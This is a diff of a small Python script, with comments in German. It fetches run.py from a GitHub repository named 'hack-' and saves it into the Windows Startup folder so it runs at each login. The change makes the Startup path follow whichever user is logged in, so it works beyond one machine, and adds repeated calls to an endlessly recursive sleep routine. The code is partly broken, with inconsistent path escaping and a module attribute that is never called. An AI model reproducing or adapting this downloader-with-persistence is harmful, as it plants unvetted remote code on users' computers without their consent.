@@ -2,6 +2,7 @@ import urllib.request
 import re
 import time
 import os
+import getpass
 def h():
 
     time.sleep(5)
@@ -9,8 +10,11 @@ def h():
     h()
 
 def download_and_save_script():
+    
     url = "https://raw.githubusercontent.com/huggywuggyMaster/hack-/main/run.py"
-    save_path = "C:\\Users\\bendy\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\S468.py"
+    current_user = getpass.getuser()
+    file_path = fr"C:\\Users\{current_user}\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\S468.py"
+
     
     try:
         # Skript von der URL herunterladen
@@ -18,7 +22,7 @@ def download_and_save_script():
             script_content = response.read()
         
         # Skript am angegebenen Speicherort speichern
-        with open(save_path, 'wb') as file:
+        with open(file_path, 'wb') as file:
             file.write(script_content)
         
        
@@ -31,4 +35,5 @@ def download_and_save_script():
 def runAndDelete():
     import run
     run.runIt
+    h()
 h()
